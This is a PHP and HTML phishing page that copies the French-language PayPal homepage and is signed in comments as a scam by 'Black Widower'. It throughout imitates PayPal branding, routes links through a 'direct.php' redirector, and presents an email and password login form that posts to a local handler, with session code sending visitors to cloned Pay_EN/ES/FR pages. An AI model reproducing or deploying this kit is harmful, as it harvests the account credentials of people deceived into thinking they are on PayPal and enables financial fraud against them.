<?php
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/


if (!isset($_SESSION)) {
  session_start();
}

ini_set('session.gc_maxlifetime', 3600);

$_SESSION['tempLang'] = 'FR';
global $cmd;
$cmd = @$_POST['cmd'];
global $temp;
$temp = @$_POST['locale_x'];
if( $cmd == "ok"){

if( $temp == 'en_US' ){
$_SESSION['tempLang'] = 'EN';

header("Location: Pay_EN.php?cmd=_login&dispatch=5885d80a13c0db1f8e263663d3faee8d4b3d02051cb40a5393d96fec50118c72");

}
if( $temp == 'es_XC' ){
$_SESSION['tempLang'] = 'ES';

header("Location: Pay_ES.php?cmd=_login&dispatch=5885d80a13c0db1f8e263663d3faee8d4b3d02051cb40a5393d96fec50118c72");

}
if( $temp == 'fr_XC' ){
$_SESSION['tempLang'] = 'FR';

header("Location: Pay_FR.php?cmd=_login&dispatch=5885d80a13c0db1f8e263663d3faee8d4b3d02051cb40a5393d96fec50118c72");
}
}?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "direct.php?site=http://www.w3.org/TR/html4/loose.dtd">
<html lang="fr">
   <head>
      <meta direct.php?site=http-equiv="Content-Type" content="text/html; charset=utf-8">
   
      <!--
      		Script info: script: webscr, cmd: _home, template: xpt/Marketing_CommandDriven/homepage/MainHome, date: Feb 10, 2011 21:59:17 PST; country: US, language: fr_XC, xslt server: 
      		web version: 67.0-1741654 branch: BWR_670_int
      		DXPT: true (LOCALE: fr_XC, COUNTRY: US, PRODUCTNUMBER: 67.0, BUILDNUMBER: 1741654, BRANCHNAME: BWR_670_int, PRODUCTNUMBEROVERRIDE: )
	pexml version: -
      		pexml version: 67.0-1755747
      		page XSL: 
             hostname : ErowmwrxOl709hQJXtc5pPSJaVw.LJ3Jjsnz5w0-C.o
               rlogid : ErowmwrxOl709hQJXtc5pGjsFNRQI2UL2rB7om4fMt2UJ65aE7nQNQ%3d%3d_12e63103c3a
      -->
      
      <title>Envoyer de l&#8217;argent, payer en ligne ou configurer un compte marchand avec PayPal</title>
      <meta name="keywords" content="envoyer de l&#8217;argent, payer en ligne, compte marchand">
      <meta name="description" content="PayPal est la solution la plus rapide et la plus s&eacute;curis&eacute;e pour envoyer de l&#8217;argent, effectuer un paiement en ligne, recevoir de l&#8217;argent ou configurer un compte marchand.">
      <meta http-equiv="X-UA-Compatible" content="IE=8">

      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/core/core.css">
      <link media="print" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/core/print.css">
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/marketing/marketing.css">
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/Marketing/css/pages/ConsumerRevamp.css">
      <!--[if IE 8]>
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/browsers/ie8.css"><![endif]-->
      
      <!--[if IE 7]>
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/browsers/ie7.css"><![endif]-->
      
      <!--[if lte IE 6]>
      <link media="screen" rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/browsers/ie6.css"><![endif]-->
      
      <link rel="stylesheet" type="text/css" href="WEBSCR-640-20101004-1/css/fr_XC/country.css">
      <link rel="apple-touch-icon" href="WEBSCR-640-20101004-1/en_US/i/pui/apple-touch-icon.png"><script type="text/javascript">
if (parent.frames.length > 0){
	top.location.replace(document.location);
}</script><style type="text/css">#welcomebox {background:url(fr_XC/Marketing/i/header/hdr_cpr_welcome_560x82.gif) no-repeat;}</style><script type="text/javascript" src="WEBSCR-640-20101004-1/js/lib/min/global.js"></script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/tns/mid.js"></script><script type="text/javascript">PAYPAL.tns.loginflow = 'xpt/Marketing_CommandDriven/homepage/MainHome';PAYPAL.tns.flashLocation = 'en_US/m/mid.swf';</script><link rel="shortcut icon" href="WEBSCR-640-20101004-1/en_US/i/icon/pp_favicon_x.ico">

   </head>
   <body>
      <noscript>
         <p class="nonjsAlert">REMARQUE : Pour utiliser de nombreuses fonctionnalit&eacute;s du site PayPal, vous avez besoin de JavaScript et de cookies. Vous pouvez les activer &agrave; l'aide des param&egrave;tres de votre navigateur.</p>
      </noscript>
      <div class="outside home" id="page">
         <div id="header" class="std">
            <h1><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_home"><img border="0" src="fr_XC/i/logo/paypal_logo.gif" alt="PayPal"></a></h1>
            <form method="post" id="searchForm" name="searchForm" action="#">
               <fieldset id="myDynamicAutoComplete" class="autocomplete">

                  <legend>Recherche PayPal</legend><label for="searchBox">Rechercher </label><input type="text" id="searchBox" name="queryString" value=""> <input type="hidden" id="sayTminLength" value="3"><input type="hidden" id="coDomain" value="US"><input type="submit" class="button" id="search.x" name="search.x" value="Rechercher" autocomplete="off"></fieldset><input name="form_charset" type="hidden" value="UTF-8"></form>
            <div id="navGlobal"><span><a href="#content" class="accessAid skip">Acc&eacute;der au contenu principal</a></span><ul>
                  <li class="first signup"><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_registration-run">Ouvrir un compte</a></li>
                  <li class="login"><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-run">Connexion</a></li>
                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/helpweb?cmd=_help">Aide</a></li>

                  <li class="last"><a href="direct.php?site=https://cms.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=security/online_security_center">S&eacute;curit&eacute; et protection</a></li>
               </ul>
            </div>
            <form method="post" id="rosetta" class="rosetta" action="Pay_FR.php?cmd=_home&dispatch=5885d80a13c0db1f8e263663d3faee8dc18bca4c6f47e633b393e284a5f8a8f8">
			<input type="hidden" name="cmd" value="ok">
               <fieldset>
                  <legend><span class="accessAid">Changer de langue</span></legend><label for="rosetta_dropdown">Language Select</label><select id="rosetta_dropdown" name="locale.x">
                     <option value="en_US">English</option>
                     <option value="es_XC">Espa&ntilde;ol</option>
           <option value="fr_XC" selected>Fran&ccedil;ais</option></select><input type="submit" name="testName" value="&gt;" class="button mini"><input type="hidden" id="change_locale_x" name="change_locale.x" value="1"></fieldset><input type="hidden" name="cmd" value="ok"><input name="form_charset" type="hidden" value="UTF-8"></form>
            <div id="navPrimary">
               <ul>

                  <li class="active"><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-general&amp;nav=0" class="scTrack:SRD:Nav:L5">Personnel</a></li>
                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-customer&amp;nav=1" class="scTrack:SRD:Nav:L8">Particulier</a></li>
                  <li><a href="direct.php?site=https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/home&amp;nav=2" class="scTrack:SRD:Nav:x60">Business</a></li>
                  <li><a href="direct.php?site=https://www.paypal.com/developer" class="scTrack:SRD:Nav:S9">D&eacute;veloppeurs</a></li>
                  <li><a href="direct.php?site=https://www.paypal-community.com/" class="scTrack:SRD:Nav:CB69">Communaut&eacute;</a></li>
               </ul>

            </div>
         </div>
         <hr>
         <div id="content">
            <div class="sidebar box login">
               <div class="header">
                  <h2>Connexion au compte</h2>
               </div>

               <div class="body">
                  <form method="post" name="login_form" action="webscr?cmd=_login-submit&amp;dispatch=5885d80a13c0db1f8e263663d3faee8dc18bca4c6f47e633b393e284a5f8a8f8">
                     <fieldset>
                        <legend>Connexion s&eacute;curis&eacute;e</legend>
                        <p><label for="login_email">Adresse email</label><input type="text" id="login_email" name="login_email" value=""></p>
                        <p><label for="login_password">Mot de passe PayPal</label><input autocomplete="off" type="password" id="login_password" name="login_password" value=""><script type="text/javascript">
<!--hide from JavaScript-challenged browsers
YAHOO.util.Event.addListener(window, "load", function(){
document.login_form.login_password.focus();
if (document.login_form.login_email.value == '') {
document.login_form.login_email.focus();
}
});
// done hiding -->

</script></p>
                        <p><label for="target_page">Consultez la page</label><select id="target_page" name="target_page">
                              <option value="0" selected>Mon compte</option>
                              <option value="1">Mes transactions</option></select></p><input type="submit" name="submit.x" value="Connexion" class="button primary"></fieldset>
                     <p><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account-recovery&amp;from=PayPal">Probl&egrave;me de connexion&nbsp;?</a></p>
                     <p>Nouveau chez PayPal ? <strong><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_registration-run">Ouvrir un compte</a></strong>.
                     </p><input name="form_charset" type="hidden" value="UTF-8"></form>

               </div>
            </div>
            <div id="maincontent">
               <div id="welcomebox">
                  <div class="welcomeLeft">
                     <h1>Votre r&eacute;flexe s&eacute;curit&eacute; pour payer et &ecirc;tre pay&eacute;.  <a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work">En savoir plus</a></h1>

                  </div>
               </div>
               <div class="t1mpi">
                  <div class="MktMPI" id="mpi600005"><a class="heroimage" href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_To_Use_PayPal"><img src="WEBSCR-640-20101004-1/fr_XC/Marketing/i/scr/scr_cpr_home_heroimage_542x228.jpg" border="0" alt=""></a></div>
               </div>
               <div id="payments">
                  <div class="firstbox">
                     <h3><a href="direct.php?site=https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/pay_online">Payer en ligne</a></h3>

                     <p>Faites vos achats et payez en ligne rapidement et en toute s&eacute;curit&eacute;. </p>
                     <p class="learnMoreArrow"><a href="direct.php?site=https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/pay_online">En savoir plus</a></p>
                  </div>
                  <div class="secondbox">
                     <h3><a href="direct.php?site=https://www.paypal.com/sendmoney">Paiement</a></h3>
                     <p>Envoyez de l'argent &agrave; toute personne poss&eacute;dant une adresse email.</p>

                     <p class="learnMoreArrow"><a href="direct.php?site=https://www.paypal.com/sendmoney">En savoir plus</a></p>
                  </div>
                  <div class="thirdbox">
                     <h3><a href="direct.php?site=https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/receive_money">Recevoir des paiements</a></h3>
                     <p>Acceptez les paiements en ligne pour les objets que vous vendez.</p>
                     <p class="learnMoreArrow"><a href="direct.php?site=https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/receive_money">En savoir plus</a></p>
                  </div><img src="WEBSCR-640-20101004-1/en_US/Marketing/i/scr/scr_cpr_graydots_547x1.gif" border="0" class="dottedline" alt=""><p class="acceptCredit">Vous souhaitez accepter les cartes bancaires ou configurer un compte marchand&nbsp;? Consultez l'espace <a href="direct.php?site=https://www.paypal.com/merchants">Solutions e-commerce</a></p>

               </div>
            </div>
            <div id="counter">
               <div class="topborder"></div>
               <div class="sideborders">
                  <p><span id="NoOfUserLogin">87.2 million</span></p>
                  <p class="pplwrld">personnes dans le monde utilisant PayPal</p>
                  <p class="signup"><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_registration-run">Ouvrir un compte</a></p>

               </div>
               <div class="btmborder"></div>
            </div>
            <div id="bgleftgradient">
               <div class="leftHeader">
                  <h3>Mieux conna&icirc;tre PayPal</h3>
               </div>
               <div id="leftBody">

                  <ul>
                     <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work">Utilisation de PayPal</a></li>
                     <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/Sign_Up_for_PayPal">Premiers pas</a></li>
                     <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/My_PayPal_Account">Gestion de votre compte</a></li>
                     <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_To_Use_PayPal">Astuces d'utilisation de PayPal</a></li>
                     <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/PayPal_FAQ">10 points essentiels sur PayPal</a></li>

                  </ul>
               </div>
            </div>
            <div id="brandbar" class="noBottomMargin">
               <div class="MktMPI" id="mpi600007"></div>
            </div>
            <div class="pd_bottom_box">
               <div class="pd_bottom_box_title">
                  <h3>Tous les produits et services personnels</h3>

               </div>
               <div class="wrapper">
                  <h4>Payer en ligne</h4>
                  <ul>
                     <li><a target="_blank" href="direct.php?site=https://www.paypal-shopping.com/">Achats PayPal</a></li>
                     <li><a target="_blank" href="direct.php?site=https://www.paypal-shopping.com/shop-stores.html">Annuaire des boutiques PayPal</a></li>
                     <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/paypal_credit_card&amp;nav=0.1.2">Cr&eacute;dit PayPal</a></li>

                     <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/mobile_payments&amp;nav=0.1.3#payonline">Effectuer vos achats via votre mobile</a></li>
                  </ul>
               </div>
               <div class="wrapper">
                  <h4>Envoi de paiement</h4>
                  <ul>
                     <li><a href="direct.php?site=https://www.paypal.com/sendmoney">Envoyer de l'argent en ligne</a></li>

                     <li><a href="direct.php?site=https://www.paypal.com/international-money-transfer">Virement international de fonds</a></li>
                     <li><a href="direct.php?site=https://student.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/student_accounts&amp;nav=0.2.2">A vos enfants</a></li>
                     <li><a href="direct.php?site=https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/mobile_payments#sendmoney">Via votre mobile</a></li>
                  </ul>
               </div>
               <div class="wrapper">
                  <h4>R&eacute;ception de paiement</h4>

                  <ul>
                     <li><a href="direct.php?site=https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/sell_on_ebay">Vendre sur eBay</a></li>
                     <li><a href="direct.php?site=https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/accept_credit_cards">Accepter les cartes de cr&eacute;dit</a></li>
                     <li><a href="direct.php?site=https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/request_money">Demande de paiement</a></li>
                     <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/fundraise">Collecte de fonds</a></li>
                     <li><a href="direct.php?site=https://www.paypal.com/merchants">Solutions e-commerce</a></li>

                  </ul>
               </div>
               <div class="wrapper">
                  <h4>Autre</h4>
                  <ul>
                     <li><a href="direct.php?site=https://student.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/student_accounts&amp;nav=1.2.2">Compte Jeune</a></li>
                     <li><a href="direct.php?site=https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/mobile_payments">PayPal Mobile</a></li>

                     <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_upgrade-interest-marcom&amp;outside=1">Compte sur livret PayPal</a></li>
                     <li><a href="direct.php?site=https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/debit_card">Carte de d&eacute;bit PayPal</a></li>
                     <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/BillMeLater_ProductOverview">Bill Me Later&reg;, un service de PayPal</a></li>
                  </ul>
               </div>
            </div>

            <div id="footer">
               <h5 class="accessAid">Plus d'informations</h5>
               <ul>
                  <li class="first"><a href="direct.php?site=http://www.paypal-media.com/aboutus.cfm">Notre soci&eacute;t&eacute;</a></li>
                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/helpscr?cmd=_help&amp;t=escalateTab">Service client&egrave;le</a></li>
                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_display-fees-outside">Tarifs</a></li>

                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/jobs-outside">Offres d'emploi</a></li>
                  <li><a href="direct.php?site=https://cms.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=developer/home">D&eacute;veloppeurs</a></li>
                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-merchant">Solutions e-commerce</a></li>
                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_display-country-functionality-outside">International</a></li>
                  <li>
<a href="javascript:O_LC()">Site Feedback</a> <img 
src="WEBSCR-640-20101004-1/css/Customer/pages/img/sm_333_oo.gif" alt="Site Feedback">
</li>
               </ul>
               <ul>
                  <li class="first"><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside">Respect de la vie priv&eacute;e</a></li>
                  <li><a href="direct.php?site=http://www.thepaypalblog.com">Notre blog</a></li>
                  <li><a href="direct.php?site=https://www.paypal-labs.com">Ateliers</a></li>

                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_web-referrals-mrb-outside">Parrainages</a></li>
                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=p/gen/ua/ua-outside">Contrats l&eacute;gaux</a></li>
                  <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Marketing/general/SiteMap-outside">Plan du site</a></li>
                  <li class="last"><a href="direct.php?site=http://www.ebay.com/">eBay</a></li>
               </ul>
               <p id="footerSecure"><a target="_blank" href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Customer/popup/SecurityKeyVIP-outside" onClick="PAYPAL.core.openWindow(event, {width: 425, height: 350})"><img border="0" src="WEBSCR-640-20101004-1/en_US/i/logo/logo_VIPwhite_66x27.gif" alt=""></a></p>

               <p id="legal">Copyright &copy; 1999-2011 PayPal. Tous droits r&eacute;serv&eacute;s.</p>
            </div>
         </div>
         <div id="navFull">
            <ul>
               <li class="active"><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-general&amp;nav=0" class="scTrack:SRD:Nav:L5">Personnel</a><ul>

                     <li class="active"><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work&amp;nav=0.0" class="scTrack:SRD:Nav:W8">Fonctionnement de PayPal</a><ul>
                           <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_does_PayPal_work&amp;nav=0.0.0" class="scTrack:SRD:Nav:YX">Qu'est-ce que PayPal</a></li>
                           <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/Sign_Up_for_PayPal&amp;nav=0.0.1" class="scTrack:SRD:Nav:YY">Premiers pas</a></li>
                           <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/My_PayPal_Account&amp;nav=0.0.2" class="scTrack:SRD:Nav:YZ">Gestion de votre compte</a></li>
                           <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/How_To_Use_PayPal&amp;nav=0.0.3" class="scTrack:SRD:Nav:W2">Utilisations de PayPal</a></li>
                           <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/PayPal_FAQ&amp;nav=0.0.4" class="scTrack:SRD:Nav:Z0">Dix choses &agrave; savoir &agrave; propos de PayPal</a></li>

                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_display-fees-outside&amp;nav=0.0.5" class="scTrack:SRD:Nav:y80">PayPal est-il vraiment gratuit ?</a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=xpt/Marketing/general/PayPalAccountTypes-outside&amp;nav=0.0.6" class="scTrack:SRD:Nav:Z8">Types de comptes</a></li>
                        </ul>
                     </li>
                     <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/pay_online&amp;nav=0.1" class="scTrack:SRD:Nav:W3">Payer en ligne</a><ul>
                           <li><a href="direct.php?site=https://www.paypal-shopping.com/" class="scTrack:SRD:Nav:Z2">Offres avantageuses</a></li>
                           <li><a href="direct.php?site=https://www.paypal-shopping.com/shop-stores.html" class="scTrack:SRD:Nav:Z3">Annuaire des boutiques PayPal</a></li>

                           <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/paypal_credit_card&amp;nav=0.1.2" class="scTrack:SRD:Nav:W4">PayPal Extras MasterCard</a></li>
                           <li><a href="direct.php?site=https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/mobile_payments#payonline&amp;nav=0.1.3" class="scTrack:SRD:Nav:L6">Effectuer des achats via un mobile</a></li>
                        </ul>
                     </li>
                     <li><a href="direct.php?site=https://www.paypal.com/sendmoney" class="scTrack:SRD:Nav:N9">Envoi d'argent</a><ul>
                           <li><a href="direct.php?site=https://www.paypal.com/sendmoney" class="scTrack:SRD:Nav:O1">Paiement en ligne</a></li>
                           <li><a href="direct.php?site=https://www.paypal.com/international-money-transfer" class="scTrack:SRD:Nav:O2">A l'international</a></li>

                           <li><a href="direct.php?site=https://student.paypal.com/us/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/student_accounts&amp;nav=0.2.2" class="scTrack:SRD:Nav:MR">A votre adolescent</a></li>
                           <li><a href="direct.php?site=https://personal.paypal.com/us/cgi-bin/?&amp;cmd=_render-content&amp;content_ID=marketing_us/mobile_payments#sendmoney&amp;nav=0.2.3" class="scTrack:SRD:Nav:Y4">Via votre mobile</a></li>
                        </ul>
                     </li>
                     <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/receive_money&amp;nav=0.3" class="scTrack:SRD:Nav:Y5">R&eacute;ception de paiements</a><ul>
                           <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/request_money&amp;nav=0.3.0" class="scTrack:SRD:Nav:Y6">Demande de paiement</a></li>

                           <li><a href="direct.php?site=https://personal.paypal.com/us/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/sell_on_ebay&amp;tab=autotab_0&amp;nav=0.3.1" class="scTrack:SRD:Nav:Y7">Solutions eBay</a></li>
                           <li><a href="direct.php?site=https://personal.paypal.com/us/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/sell_on_ebay&amp;tab=autotab_1&amp;nav=0.3.2" class="scTrack:SRD:Nav:P6">Vendre par petites annonces</a></li>
                           <li><a href="direct.php?site=https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/wp_standard&amp;nav=0.3.3" class="scTrack:SRD:Nav:BM76">Vendre sur votre site</a></li>
                           <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/fundraise&amp;nav=0.3.4" class="scTrack:SRD:Nav:P7">Collecte de fonds</a></li>
                        </ul>
                     </li>
                     <li><a href="direct.php?site=https://personal.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=marketing_us/products_services&amp;nav=0.4" class="scTrack:SRD:Nav:P8">Produits et services</a></li>

                  </ul>
               </li>
               <li><a href="direct.php?site=https://www.paypal.com/us/cgi-bin/webscr?cmd=_home-customer&amp;nav=1" class="scTrack:SRD:Nav:L8">Particulier</a></li>
               <li><a href="direct.php?site=https://merchant.paypal.com/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=merchant/home&amp;nav=2" class="scTrack:SRD:Nav:x60">Business</a></li>
               <li><a href="direct.php?site=https://www.paypal.com/developer" class="scTrack:SRD:Nav:S9">D&eacute;veloppeurs</a></li>
               <li><a href="direct.php?site=https://www.paypal-community.com/" class="scTrack:SRD:Nav:CB69">Communaut&eacute;</a></li>

            </ul>
         </div><script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script></div><script type="text/javascript" src="direct.php?site=https://www.paypalobjects.com/WEBSCR-640-20110306-1/js/lib/min/widgets.js"></script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/iconix.js"></script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/pageBlockingUnsafeBrowsers.js"></script><script type="text/javascript" src="js/tns/min/bid.js"></script><script type="text/javascript">
                                YAHOO.util.Event.addListener(window,"load",function(){
                                       try {
                            PAYPAL.bp.init("login_form","bp_mid");PAYPAL.ks.init("login_form","login_password","bp_ks1");PAYPAL.common.appendField("login_form", "bp_ks2");PAYPAL.common.appendField("login_form", "bp_ks3");
                                    } catch(err){}
                                });
                            </script><script type="text/javascript" src="WEBSCR-640-20101004-1/js/pp_naturalsearch.js"></script><script type="text/javascript">mp_landing();</script><div id="ppwebapi" class="advonqo.mha,hfb.lnb-k`ox`o-rdhsqdonqo"></div>
      <!-- SiteCatalyst Code
      Copyright 1997-2005 Omniture, Inc.
      More info available at direct.php?site=http://www.omniture.com -->
      <script type="text/javascript" src="WEBSCR-640-20101004-1/js/site_catalyst/pp_jscode_080706.js"></script>

      <script type="text/javascript">
      s.prop1="xpt/Marketing_CommandDriven/homepage/MainHome";
      s.prop7="Unknown";
      s.prop8="Unknown";
      s.prop9="Unknown";
      s.prop10="US";
      s.prop14="";
      s.prop16="";
      s.prop34="PayPalCredit:Servicing:CO:NoTransactions";
      s.prop15="";
      s.pageName="SRD: Main Home";
      s.channel="SRD";
      s.prop50="fr_XC";
      s.prop18="";
      </script>
      <script type="text/javascript"><!--
      /************* DO NOT ALTER ANYTHING BELOW THIS LINE ! **************/
      var s_code=s.t();if(s_code)document.write(s_code);
      if(navigator.appVersion.indexOf('MSIE')>=0)document.write(unescape('%3C')+'\!-'+'-')
      //-->
      </script><noscript><img
      src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript"
      height="1" width="1" border="0" alt="" /></noscript>
      <!--/DO NOT REMOVE/-->
      
      <!-- End SiteCatalyst Code -->
      </body>
</html>
<?php 
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
/***   Scam Made By Black Widower 2012=====201?  **/
?>